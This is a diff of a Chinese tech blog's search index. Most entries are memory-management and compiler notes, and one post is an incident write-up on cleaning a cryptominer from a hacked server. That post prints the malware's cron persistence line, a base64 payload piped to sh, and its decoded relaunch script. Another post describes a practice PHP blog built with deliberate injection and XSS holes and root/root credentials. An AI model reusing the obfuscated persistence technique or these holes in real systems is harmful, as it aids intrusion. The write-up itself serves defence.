+    <content><![CDATA[<p>之前的站点被sql注入然后提权了,服务器直接失联,同时还被删库了...</p>
+<p>谨以此文记录</p>
+<h2 id="事发背景">事发背景</h2>
+<p>笔者部署了一个自动健康打卡程序(我只是GitHub的搬运工(doge))突然不打卡了,然后ssh上去看看情况,结果发现ssh上不去了,整个服务器直接失联,人都傻了</p>
+<p>直接重装服务器也并非一个明智的选择,因为所有备份数据需要ftp/ssh连上去服务器才可以开展</p>
+<p>姑且先尝试在阿里云后台点击服务器关机,结果关都关不了,无奈之下选择强制关机,然后重新开机,成功连接ssh(后续发现数据库文件已损坏)</p>
+<p>进去shell之后直接输入<code>top</code>命令</p>
+<p>看到了一个可疑进程占用率极高,而且在不断攀升,不一会就变成了90%+</p>
+<p>通过搜索进程名(ld-linux-x86-64)发现是个挖矿病毒</p>
+<h1 id="病毒细节">病毒细节</h1>
+<p>搜了一下发现变种比较多，这里讲一种个人感觉比较有意思的变种,说不定可以用来出一道密码学签到题23333</p>
+<p>大致思路为:利用管道符加密，解密病毒脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;something encrypted by base64&quot;  base64 -di  sh</span><br></pre></td></tr></table></figure>
+<p>echo的内容即为脚本病毒核心内容经base64加密(当然,也可以换成其他加密方式)后的字符串</p>
+<h1 id="杀毒">杀毒</h1>
+<p>病毒的变种比较多,网上有的文章是test用户下的文件是病毒的核心文件(test用户是攻击者提权之后创建的),而有的是mysql用户,方法不一,最终笔者找到了一个泛用性较好的方法</p>
+<p>在搜索的过程中,笔者首次了解到ClamAV这款Linux端开源杀毒软件，于是尝试使用其进行杀毒</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#CentOS 8.2</span><br><span class="line">sudo dnf --enablerepo=extras install epel-release</span><br><span class="line">sudo dnf update -y</span><br><span class="line">yum install clamd -y</span><br><span class="line">freshclam</span><br><span class="line">service clamd start</span><br><span class="line">chkconfig clamd on</span><br><span class="line">clamscan -r / --move=/tmp</span><br></pre></td></tr></table></figure>
+<p>然后就会开始全盘扫描</p>
+<p>上述代码中,最后一行的<code>/</code>是扫描的目录范围，<code>--move</code>选项是移至隔离区</p>
+<p>扫描出来3个被感染的文件</p>
+<p>删除之后问题仍然存在,说明有个进程会监听并拉起病毒程序,经网上文章提示,查看了一下crontab任务清单</p>
+<p><code>crontab -l</code></p>
+<p>发现可疑进程,每1分钟执行一次,内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env bash</span><br><span class="line"></span><br><span class="line">echo &#x27;IyEvYmluL3NoCmlmIHRlc3QgLXIgL3NiaW4vaW5pdGN0MTsgdGhlbgpwaWQ9JChjYXQgL3NiaW4v</span><br><span class="line">aW5pdGN0MSkKaWYgJChraWxsIC1DSExEICRwaWQgPi9kZXYvbnVsbCAyPiYxKQp0aGVuCnNsZWVw</span><br><span class="line">IDEKZWxzZQpjZCAvc2JpbgouL21rZTNmcyAmPi9kZXYvbnVsbApleGl0IDAKZmkKZmkK&#x27;  base64 -di  sh</span><br></pre></td></tr></table></figure>
+<p>base64解密后内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">if test -r /sbin/initct1; then</span><br><span class="line">pid=$(cat /sbin/initct1)</span><br><span class="line">if $(kill -CHLD $pid &gt;/dev/null 2&gt;&amp;1)</span><br><span class="line">then</span><br><span class="line">sleep 1</span><br><span class="line">else</span><br><span class="line">cd /sbin</span><br><span class="line">./mke3fs &amp;&gt;/dev/null</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>删除该用户的所有crontab,然后再次全盘扫描即可</p>
+<p>但是攻击方究竟是如何注入进来的....</p>
+<p>限于目前笔者水平,看不懂Linux网络日志emmmm,只好作罢</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>二进制</category>
+        <category>杂谈</category>
+      </categories>
+      <tags>
+        <tag>服务器</tag>
+        <tag>病毒</tag>
+        <tag>挖矿</tag>
+      </tags>
   </entry>
   <entry>
     <title>linus的速删链表节点代码</title>
@@ -940,31 +942,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054779
       </categories>
   </entry>
   <entry>
-    <title>MMU笔记（3） 对堆I/O过程的多线程优化思路</title>
-    <url>/mmu-bi-ji-3-dui-dui-i-o-guo-cheng-de-duo-xian-cheng-you-hua-si-lu/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>本文的讨论基于现代Windows操作系统堆管理API，不包含任何stdmem系列函数</p>
-<h2 id="正文">正文</h2>
-<p>众所周知，Windows的堆分为默认堆和私有堆，而私有堆其实就是分配在默认堆上面的，换句话来说蛋糕不会变大，都是4GB空间</p>
-<p>默认堆可以被直接使用，但是为了防止多线程之间对某一块内存doubleCheck，doubleFree等，所以对默认堆进行异步操作是非法的，如果同时有两个线程操作同一个默认堆，实际上程序效率是变低的，因为需要等待上下文</p>
-<p>正确做法是分配私有堆，私有堆是预留的，受保护的</p>
-<p>私有堆还有一个好处是</p>
-<p>当我们发现进程A的程序逻辑偏离预期时，我们一般都会从A查起，但是其实这有可能是B对默认堆的误操作造成的：私有堆降低了维护难度</p>
-<h2 id="补充">补充</h2>
-<p>请求新堆时的操作为：</p>
-<p>（1）遍历已分配的和空闲的内存块的链接表。<br />
-（2）寻找一个空闲内存块的地址。<br />
-（3）通过将空闲内存块标记为“已分配”来分配新内存块。<br />
-（4）将新内存块添加给内存块链接表。</p>
-<p>可以发现，如果线程A执行完 （1） （2） 后，系统切换到线程B执行
-（1）（2），并且他们都找到了同一块内存，这样的后果是灾难性的，因此堆和堆链表的访问权是独占的，而私有堆则是专有的</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
-  </entry>
-  <entry>
     <title>manjaro KDE 配置pwn环境遇到的问题</title>
     <url>/manjaro-kde-pei-zhi-pwn-huan-jing-yu-dao-de-wen-ti/</url>
     <content><![CDATA[<h2
@@ -989,8 +966,8 @@ id="konsole无法唤起pwndbg唤起新窗口后无法正确识别shebang">Konsol
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>开发</category>
         <category>存档</category>
         <category>PWN</category>
@@ -999,26 +976,6 @@ id="konsole无法唤起pwndbg唤起新窗口后无法正确识别shebang">Konsol
       <tags>
         <tag>环境配置</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>MMU笔记（5） 要把线性地址、物理地址、磁盘空间、磁盘地址结合起来看待</title>
-    <url>/mmu-bi-ji-5-yao-ba-xian-xing-di-zhi-wu-li-di-zhi-ci-pan-kong-jian/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>在学习内存相关的知识时，映射不应被看作是一个普通的指针，而应该是被看作是双向指针，或者是迭代器</p>
-<h2 id="正文">正文</h2>
-<p>算是真正理解了映射，虽然细节上会有一些出入（因为那些细节有点太深了，不知道如何观察，比如先后顺序什么的，姑且先不考虑），但是下面的内容如果能把映射这一操作理解为迭代器，或者双向指针就好理解很多了</p>
-<p>线性内存的某一块映射到物理内存，这并不是单纯意味着物理内存指向线性内存的指针，同理，把磁盘文件映射到线性内存也不单是指向磁盘内存的fp指针，因为他们是双向互认的</p>
-<p>假设用户程序A需要使用到用户自行编写的dll库B，其他任何程序都不会使用B</p>
-<p>那么在打开A的时候物理内存当中并未加载B，因此A掷错缺页，尝试加载B，但并非直接加载而是先从磁盘空间加载到线性内存，再映射物理内存</p>
-<p>如果调用的是已经存在物理内存当中的dll，这时候就要结合起来看待了，首先尝试把磁盘当中的dll映射到线性内存，但是操作系统维护的表表明该DLL已经加载到物理内存了，这时候是便是从物理内存映射到线性内存了</p>
-<p>这样挺难理解的，因为我们并不能说从线性内存映射到物理内存，因为不能说一个没有的东西映射到已经存在的东西上面（实际上很多地方就是这样说的，个人感觉不好）</p>
-<p>但是从物理内存映射到线性内存也不是很好理解，因为线性内存是会经过MMU映射到物理内存的有点回调的味道</p>
-<p>所以应该把这种映射理解为双向互认，是一种迭代（实际是查表，操作系统维护一张表，但是查表个人感觉就复杂了，如果描述成迭代就好理解多了），而非简单的单向指针</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
   </entry>
   <entry>
     <title>MMU笔记（4） 内存页映射与内存共享机制</title>
@@ -1063,6 +1020,92 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172117208
         <category>笔记</category>
         <category>存档</category>
       </categories>
+  </entry>
+  <entry>
+    <title>MMU笔记（3） 对堆I/O过程的多线程优化思路</title>
+    <url>/mmu-bi-ji-3-dui-dui-i-o-guo-cheng-de-duo-xian-cheng-you-hua-si-lu/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>本文的讨论基于现代Windows操作系统堆管理API，不包含任何stdmem系列函数</p>
+<h2 id="正文">正文</h2>
+<p>众所周知，Windows的堆分为默认堆和私有堆，而私有堆其实就是分配在默认堆上面的，换句话来说蛋糕不会变大，都是4GB空间</p>
+<p>默认堆可以被直接使用，但是为了防止多线程之间对某一块内存doubleCheck，doubleFree等，所以对默认堆进行异步操作是非法的，如果同时有两个线程操作同一个默认堆，实际上程序效率是变低的，因为需要等待上下文</p>
+<p>正确做法是分配私有堆，私有堆是预留的，受保护的</p>
+<p>私有堆还有一个好处是</p>
+<p>当我们发现进程A的程序逻辑偏离预期时，我们一般都会从A查起，但是其实这有可能是B对默认堆的误操作造成的：私有堆降低了维护难度</p>
+<h2 id="补充">补充</h2>
+<p>请求新堆时的操作为：</p>
+<p>（1）遍历已分配的和空闲的内存块的链接表。<br />
+（2）寻找一个空闲内存块的地址。<br />
+（3）通过将空闲内存块标记为“已分配”来分配新内存块。<br />
+（4）将新内存块添加给内存块链接表。</p>
+<p>可以发现，如果线程A执行完 （1） （2） 后，系统切换到线程B执行
+（1）（2），并且他们都找到了同一块内存，这样的后果是灾难性的，因此堆和堆链表的访问权是独占的，而私有堆则是专有的</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>存档</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>MMU笔记（5） 要把线性地址、物理地址、磁盘空间、磁盘地址结合起来看待</title>
+    <url>/mmu-bi-ji-5-yao-ba-xian-xing-di-zhi-wu-li-di-zhi-ci-pan-kong-jian/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>在学习内存相关的知识时，映射不应被看作是一个普通的指针，而应该是被看作是双向指针，或者是迭代器</p>
+<h2 id="正文">正文</h2>
+<p>算是真正理解了映射，虽然细节上会有一些出入（因为那些细节有点太深了，不知道如何观察，比如先后顺序什么的，姑且先不考虑），但是下面的内容如果能把映射这一操作理解为迭代器，或者双向指针就好理解很多了</p>
+<p>线性内存的某一块映射到物理内存，这并不是单纯意味着物理内存指向线性内存的指针，同理，把磁盘文件映射到线性内存也不单是指向磁盘内存的fp指针，因为他们是双向互认的</p>
+<p>假设用户程序A需要使用到用户自行编写的dll库B，其他任何程序都不会使用B</p>
+<p>那么在打开A的时候物理内存当中并未加载B，因此A掷错缺页，尝试加载B，但并非直接加载而是先从磁盘空间加载到线性内存，再映射物理内存</p>
+<p>如果调用的是已经存在物理内存当中的dll，这时候就要结合起来看待了，首先尝试把磁盘当中的dll映射到线性内存，但是操作系统维护的表表明该DLL已经加载到物理内存了，这时候是便是从物理内存映射到线性内存了</p>
+<p>这样挺难理解的，因为我们并不能说从线性内存映射到物理内存，因为不能说一个没有的东西映射到已经存在的东西上面（实际上很多地方就是这样说的，个人感觉不好）</p>
+<p>但是从物理内存映射到线性内存也不是很好理解，因为线性内存是会经过MMU映射到物理内存的有点回调的味道</p>
+<p>所以应该把这种映射理解为双向互认，是一种迭代（实际是查表，操作系统维护一张表，但是查表个人感觉就复杂了，如果描述成迭代就好理解多了），而非简单的单向指针</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>存档</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>mov edi,edi的意义</title>
+    <url>/mov-ediedi-de-yi-yi/</url>
+    <content><![CDATA[<p>所有WindowsAPI第一句都是mov edi,edi</p>
+<p>有点好奇,查了一下原因,写篇笔记</p>
+<p>本质上来讲，mov
+edi,edi相当于在PE中占两字节长度的NOP，消耗的CPU时钟也和NOP相同（在某些常见架构下）</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057596.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056031.png" /></p>
+<p>即使不相同也相近，基本不影响整体效率</p>
+<p>提到效率，可能有人已经反应过来了</p>
+<p>这个确实是一个在正常状态下完全没意义的指令，只会消耗CPU时钟，他唯一的意义是帮助开发者热更新和打补丁</p>
+<p>这基本解决了我对如何实现汇编级热更新和汇编级补丁的所有疑问</p>
+<p>参考文章如下</p>
+<p>https://devblogs.microsoft.com/oldnewthing/20110921-00/?p=9583</p>
+<p>选取几个要点翻译一下</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057788.png" /></p>
+<p>我们在调用系统api的时候，并不是一进去就jmp的，而是先mov edi</p>
+<p>这样的话，如果需要热更新这个api就只需要先在全局层面修改dll文件，宏观表现就是hook掉</p>
+<p>至于如何修改，这里涉及到机器码长度</p>
+<p>long jmp和mov
+edi,edi的机器码长度是相同的，这样就不用在热更新时修改PE头了，实际上热更新时也不可能修改PE头的节区地址，这会影响到整个文件</p>
+<p>Windows系统DLL都有这一行，不过主流编译环境基本都可以让你自己的dll库加上这个指令，只需要在设置里面开启即可</p>
+<p>文章还解释了一下为什么不直接用hook来热更新，说不能确定的任一调用者执行点什么的，没看懂，个人感觉从技术上应该可以做到，不过笔者也没做过hook，先按下不表，姑且认为是这样的，估计做过hook实验就明白了</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>笔记</category>
+        <category>二进制</category>
+        <category>开发</category>
+        <category>存档</category>
+        <category>逆向</category>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows API</tag>
+      </tags>
   </entry>
   <entry>
     <title>Move Player</title>
@@ -1145,83 +1188,46 @@ player's experience</p>
       </categories>
   </entry>
   <entry>
-    <title>mov edi,edi的意义</title>
-    <url>/mov-ediedi-de-yi-yi/</url>
-    <content><![CDATA[<p>所有WindowsAPI第一句都是mov edi,edi</p>
-<p>有点好奇,查了一下原因,写篇笔记</p>
-<p>本质上来讲，mov
-edi,edi相当于在PE中占两字节长度的NOP，消耗的CPU时钟也和NOP相同（在某些常见架构下）</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057596.png" /></p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056031.png" /></p>
-<p>即使不相同也相近，基本不影响整体效率</p>
-<p>提到效率，可能有人已经反应过来了</p>
-<p>这个确实是一个在正常状态下完全没意义的指令，只会消耗CPU时钟，他唯一的意义是帮助开发者热更新和打补丁</p>
-<p>这基本解决了我对如何实现汇编级热更新和汇编级补丁的所有疑问</p>
-<p>参考文章如下</p>
-<p>https://devblogs.microsoft.com/oldnewthing/20110921-00/?p=9583</p>
-<p>选取几个要点翻译一下</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057788.png" /></p>
-<p>我们在调用系统api的时候，并不是一进去就jmp的，而是先mov edi</p>
-<p>这样的话，如果需要热更新这个api就只需要先在全局层面修改dll文件，宏观表现就是hook掉</p>
-<p>至于如何修改，这里涉及到机器码长度</p>
-<p>long jmp和mov
-edi,edi的机器码长度是相同的，这样就不用在热更新时修改PE头了，实际上热更新时也不可能修改PE头的节区地址，这会影响到整个文件</p>
-<p>Windows系统DLL都有这一行，不过主流编译环境基本都可以让你自己的dll库加上这个指令，只需要在设置里面开启即可</p>
-<p>文章还解释了一下为什么不直接用hook来热更新，说不能确定的任一调用者执行点什么的，没看懂，个人感觉从技术上应该可以做到，不过笔者也没做过hook，先按下不表，姑且认为是这样的，估计做过hook实验就明白了</p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
-        <category>笔记</category>
-        <category>开发</category>
-        <category>逆向</category>
-        <category>存档</category>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Windows API</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>开发一个简单blog（无CSS实现；包含撰文，评论等多种功能）</title>
-    <url>/my-blog/</url>
+    <title>.Net,Mono,C# 编译流程及一部分编译原理</title>
+    <url>/net-mono-c/</url>
     <content><![CDATA[<h2 id="背景">背景</h2>
-<p>逆向太难了，学成傻逼了，果断转web</p>
-<p>老话说的好，要想学安全，得先学开发，于是笔者思考了一下：</p>
-<p>目前只会简单的js和html，那就开发一个纯后端（PHP+MySQL）的博客实现吧，这样就可以学习PHP和MySQL啦</p>
-<h2 id="阅读本文前置知识">阅读本文前置知识</h2>
-<p>虽说笔者在开发这个项目前毫无后端经验，但是强烈建议读者至少学会PHP基础语法再看本文</p>
+<p>其实很早之前就奇怪过一个问题:</p>
+<p>类似于JAVA,C#这种跨平台性优良的语言,</p>
+<p>我可以理解他们的同样一份代码,在不同平台的相同内核的虚拟机上表现相同</p>
+<p>但是我无法理解他们能够在这么多不同CPU指令集环境下,维持高效的内核开发进度</p>
+<p>这两天看了一些C#相关的编译原理,理解了其中的大部分问题</p>
 <h2 id="正文">正文</h2>
-<p>本文主要是记录开发过程中遇到的一些问题，而非手把手教学</p>
-<h3 id="环境">环境</h3>
-<p>由于笔者开发机之前配过php和MySQL环境，现在的环境并不干净，尝试了各种解决办法之后依旧连接不上localhost（MySQL），最终使用phpstudy终于卸载干净了，然后依据菜鸟教程上面的方法配好了MySQL8.0环境</p>
-<p>在这一过程中途还产生了连接远程服务器（也就是此博客的服务器）上面的数据库，但是在phpstorm里面连不上，不知道是哪里出了问题。。。（用户名密码正确，端口全放开了，数据库权限也放开了，SSH可以连上，没有挂任何正向代理或反向代理服务）</p>
-<p>而在datagrip里面是可以正常连接的。。。</p>
-<h3 id="开发构想">开发构想</h3>
-<p>实现一个主页，主页当中有欢迎语和菜单栏，菜单栏指向文章编辑器，文章浏览页，个人资料页</p>
-<p>其中，文章编辑器会故意留下安全性问题，便于后续注入测试</p>
-<p>个人资料页提供修改密码功能，并会故意留下安全性问题，便于后续注入测试</p>
-<p>文章浏览页会按照时间顺序显示所有文章的标题，并将标题超链接至对应地址</p>
-<p>文章页包括文章主体内容和一个评论区，评论区内容不会做任何过滤，便于后续测试XSS注入</p>
-<h3 id="开发过程遇到的问题">开发过程遇到的问题</h3>
-<p>根据构想，许多页面的首要任务是连接数据库,然后读取或写入数据</p>
-<p>根据代码复用原则创建文件<code>connectToDB.php</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 永远不写重复的代码</span><br><span class="line">$host=&#x27;localhost&#x27;;</span><br><span class="line">$user=&#x27;root&#x27;;</span><br><span class="line">$passwd=&#x27;root&#x27;;</span><br><span class="line">$dbname=&#x27;myblog&#x27;;</span><br><span class="line">$conn=mysqli_connect($host,$user,$passwd);</span><br></pre></td></tr></table></figure>
-<p>然后在需要连接数据库的php页当中</p>
-<p><code>include_once 'connectToDB.php'</code></p>
-<p>然后复用<code>$conn</code>变量</p>
-<p>但是实测发现跨php文件使用变量（即便是全局变量）是被禁止的，改为使用$_GLOBALS数组</p>
-<p>顺便查了一下Session和Global的区别，下面这篇帖子说的非常一针见血，一看就懂</p>
-<p>https://stackoverflow.com/questions/14848145/what-is-the-difference-between-session-variables-global-variables-in-php/14848246</p>
-<h2 id="尾声">尾声</h2>
-<p>这篇文章写道一半的时候重装电脑了,然后忘记备份这个博客的源码了.....</p>
-<p>最终博客是全都开发完成的状态,可惜文章烂尾了</p>
+<p>首先是梦回JAVA,</p>
+<p>在学习基于虚拟机的语言的时候,大多会遇到一堆偏底层的名词,同时有的名词只会出现在特定语言的导论里面,姑且总结其中一些</p>
+<ul>
+<li>CIL(Common Intermediate Language)
+通用中间件语言,可以理解为虚拟机的虚拟机机器码,并非本机环境的实际CPU可读机器码;<strong>通用二字的是因为这项标准是由微软惠普英特尔等巨头起草的</strong></li>
+<li>CLI(Common Language
+Infrastructure)通用语言架构,包含CIL等组件的整个通用语言<strong>架构</strong></li>
+<li>Native code 原生码本机CPU直接可读的机器码</li>
+<li>Rumtime 运行时
+(名词),指的是并非由当前程序开发者直接经手编写的代码/指令,其中包括各种init函数,start函数,和虚拟机环境启动函数以及各种类库</li>
+</ul>
+<p>然后是查找过程中发现的几篇英语文章,感觉很透彻,一看就懂,翻译(机翻)部分引用如下</p>
+<p>机器码：这是最明确的一种。它是使用字节码指令的代码，你的处理器（做实际工作的物理金属片）能够理解并直接执行。所有其他代码必须在你的机器能够执行之前被翻译或转换为机器代码。</p>
+<blockquote>
+<p>原生码：这个术语有时被用于指机器代码（见上文）的地方。然而，它有时也被用来指非托管代码（见下文）。<br />
+<strong>非管理代码和管理代码</strong>：非管理代码指的是用C或C++等编程语言编写的代码，它被直接编译成机器代码。它与托管代码形成对比，后者是用C#、VB.NET、Java或类似的语言编写的，并在虚拟环境（如.NET或JavaVM）中执行，后者有点像在软件中
+"模拟
+"一个处理器。主要区别在于，托管代码通过使用垃圾收集和保持对对象的引用不透明，为你
+"管理
+"资源（主要是内存分配）。非托管代码是那种需要你手动分配和取消分配内存的代码，有时会造成内存泄漏（当你忘记取消分配时），有时会造成分段故障（当你过早取消分配时）。无人管理通常也意味着没有对常见的错误进行运行时检查，如空指针解读或数组边界溢出。<br />
+严格来说，大多数动态类型的语言--如Perl、Python、PHP和Ruby--也是可管理代码。然而，它们通常不被这样描述，这表明托管代码实际上是真正大的、严肃的、商业编程环境（.NET和Java）的一个营销术语。<br />
+汇编代码：这个术语通常指的是人们在真正想写字节码时写的那种源代码。汇编器是一个将这种源代码变成真正的字节码的程序。它不是一个编译器，因为它是1对1的转换。然而，这个术语在使用哪种字节码方面是模糊的：它可能是受管理的或未受管理的。如果是非管理的，产生的字节码是机器码。如果它是受管理的，它的结果是虚拟环境（如.NET）在幕后使用的字节码。管理代码（如C#、Java）被编译成这种特殊的字节码语言，在.NET中被称为通用中间语言（CIL），在Java中被称为Java字节码。通常情况下，普通程序员很少需要访问这种代码或直接用这种语言编写，但当人们这样做时，他们通常将其称为汇编代码，因为他们使用汇编器将其变成字节代码。</p>
+</blockquote>
+<blockquote>
+<p>运行时描述的是在你的程序运行时执行的软件/指令，特别是那些你没有明确写的指令，但对于你的代码的正常执行是必要的。<br />
+像C这样的低级语言的runtime非常小（如果有的话）。像Objective-C这样更复杂的语言，允许动态消息传递，有一个更广泛的runtime</p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>黑历史与垃圾</category>
+        <category>开发</category>
+        <category>GamePlay</category>
       </categories>
   </entry>
   <entry>
@@ -1322,8 +1328,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116512
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
         <category>PWN</category>
       </categories>
@@ -1332,46 +1338,42 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116512
       </tags>
   </entry>
   <entry>
-    <title>.Net,Mono,C# 编译流程及一部分编译原理</title>
-    <url>/net-mono-c/</url>
+    <title>开发一个简单blog（无CSS实现；包含撰文，评论等多种功能）</title>
+    <url>/my-blog/</url>
     <content><![CDATA[<h2 id="背景">背景</h2>
-<p>其实很早之前就奇怪过一个问题:</p>
-<p>类似于JAVA,C#这种跨平台性优良的语言,</p>
-<p>我可以理解他们的同样一份代码,在不同平台的相同内核的虚拟机上表现相同</p>
-<p>但是我无法理解他们能够在这么多不同CPU指令集环境下,维持高效的内核开发进度</p>
-<p>这两天看了一些C#相关的编译原理,理解了其中的大部分问题</p>
+<p>逆向太难了，学成傻逼了，果断转web</p>
+<p>老话说的好，要想学安全，得先学开发，于是笔者思考了一下：</p>
+<p>目前只会简单的js和html，那就开发一个纯后端（PHP+MySQL）的博客实现吧，这样就可以学习PHP和MySQL啦</p>
+<h2 id="阅读本文前置知识">阅读本文前置知识</h2>
+<p>虽说笔者在开发这个项目前毫无后端经验，但是强烈建议读者至少学会PHP基础语法再看本文</p>
 <h2 id="正文">正文</h2>
-<p>首先是梦回JAVA,</p>
-<p>在学习基于虚拟机的语言的时候,大多会遇到一堆偏底层的名词,同时有的名词只会出现在特定语言的导论里面,姑且总结其中一些</p>
-<ul>
-<li>CIL(Common Intermediate Language)
-通用中间件语言,可以理解为虚拟机的虚拟机机器码,并非本机环境的实际CPU可读机器码;<strong>通用二字的是因为这项标准是由微软惠普英特尔等巨头起草的</strong></li>
-<li>CLI(Common Language
-Infrastructure)通用语言架构,包含CIL等组件的整个通用语言<strong>架构</strong></li>
-<li>Native code 原生码本机CPU直接可读的机器码</li>
-<li>Rumtime 运行时
-(名词),指的是并非由当前程序开发者直接经手编写的代码/指令,其中包括各种init函数,start函数,和虚拟机环境启动函数以及各种类库</li>
-</ul>
-<p>然后是查找过程中发现的几篇英语文章,感觉很透彻,一看就懂,翻译(机翻)部分引用如下</p>
-<p>机器码：这是最明确的一种。它是使用字节码指令的代码，你的处理器（做实际工作的物理金属片）能够理解并直接执行。所有其他代码必须在你的机器能够执行之前被翻译或转换为机器代码。</p>
-<blockquote>
-<p>原生码：这个术语有时被用于指机器代码（见上文）的地方。然而，它有时也被用来指非托管代码（见下文）。<br />
-<strong>非管理代码和管理代码</strong>：非管理代码指的是用C或C++等编程语言编写的代码，它被直接编译成机器代码。它与托管代码形成对比，后者是用C#、VB.NET、Java或类似的语言编写的，并在虚拟环境（如.NET或JavaVM）中执行，后者有点像在软件中
-"模拟
-"一个处理器。主要区别在于，托管代码通过使用垃圾收集和保持对对象的引用不透明，为你
-"管理
-"资源（主要是内存分配）。非托管代码是那种需要你手动分配和取消分配内存的代码，有时会造成内存泄漏（当你忘记取消分配时），有时会造成分段故障（当你过早取消分配时）。无人管理通常也意味着没有对常见的错误进行运行时检查，如空指针解读或数组边界溢出。<br />
-严格来说，大多数动态类型的语言--如Perl、Python、PHP和Ruby--也是可管理代码。然而，它们通常不被这样描述，这表明托管代码实际上是真正大的、严肃的、商业编程环境（.NET和Java）的一个营销术语。<br />
-汇编代码：这个术语通常指的是人们在真正想写字节码时写的那种源代码。汇编器是一个将这种源代码变成真正的字节码的程序。它不是一个编译器，因为它是1对1的转换。然而，这个术语在使用哪种字节码方面是模糊的：它可能是受管理的或未受管理的。如果是非管理的，产生的字节码是机器码。如果它是受管理的，它的结果是虚拟环境（如.NET）在幕后使用的字节码。管理代码（如C#、Java）被编译成这种特殊的字节码语言，在.NET中被称为通用中间语言（CIL），在Java中被称为Java字节码。通常情况下，普通程序员很少需要访问这种代码或直接用这种语言编写，但当人们这样做时，他们通常将其称为汇编代码，因为他们使用汇编器将其变成字节代码。</p>
-</blockquote>
-<blockquote>
-<p>运行时描述的是在你的程序运行时执行的软件/指令，特别是那些你没有明确写的指令，但对于你的代码的正常执行是必要的。<br />
-像C这样的低级语言的runtime非常小（如果有的话）。像Objective-C这样更复杂的语言，允许动态消息传递，有一个更广泛的runtime</p>
-</blockquote>
+<p>本文主要是记录开发过程中遇到的一些问题，而非手把手教学</p>
+<h3 id="环境">环境</h3>
+<p>由于笔者开发机之前配过php和MySQL环境，现在的环境并不干净，尝试了各种解决办法之后依旧连接不上localhost（MySQL），最终使用phpstudy终于卸载干净了，然后依据菜鸟教程上面的方法配好了MySQL8.0环境</p>
+<p>在这一过程中途还产生了连接远程服务器（也就是此博客的服务器）上面的数据库，但是在phpstorm里面连不上，不知道是哪里出了问题。。。（用户名密码正确，端口全放开了，数据库权限也放开了，SSH可以连上，没有挂任何正向代理或反向代理服务）</p>
+<p>而在datagrip里面是可以正常连接的。。。</p>
+<h3 id="开发构想">开发构想</h3>
+<p>实现一个主页，主页当中有欢迎语和菜单栏，菜单栏指向文章编辑器，文章浏览页，个人资料页</p>
+<p>其中，文章编辑器会故意留下安全性问题，便于后续注入测试</p>
+<p>个人资料页提供修改密码功能，并会故意留下安全性问题，便于后续注入测试</p>
+<p>文章浏览页会按照时间顺序显示所有文章的标题，并将标题超链接至对应地址</p>
+<p>文章页包括文章主体内容和一个评论区，评论区内容不会做任何过滤，便于后续测试XSS注入</p>
+<h3 id="开发过程遇到的问题">开发过程遇到的问题</h3>
+<p>根据构想，许多页面的首要任务是连接数据库,然后读取或写入数据</p>
+<p>根据代码复用原则创建文件<code>connectToDB.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 永远不写重复的代码</span><br><span class="line">$host=&#x27;localhost&#x27;;</span><br><span class="line">$user=&#x27;root&#x27;;</span><br><span class="line">$passwd=&#x27;root&#x27;;</span><br><span class="line">$dbname=&#x27;myblog&#x27;;</span><br><span class="line">$conn=mysqli_connect($host,$user,$passwd);</span><br></pre></td></tr></table></figure>
+<p>然后在需要连接数据库的php页当中</p>
+<p><code>include_once 'connectToDB.php'</code></p>
+<p>然后复用<code>$conn</code>变量</p>
+<p>但是实测发现跨php文件使用变量（即便是全局变量）是被禁止的，改为使用$_GLOBALS数组</p>
+<p>顺便查了一下Session和Global的区别，下面这篇帖子说的非常一针见血，一看就懂</p>
+<p>https://stackoverflow.com/questions/14848145/what-is-the-difference-between-session-variables-global-variables-in-php/14848246</p>
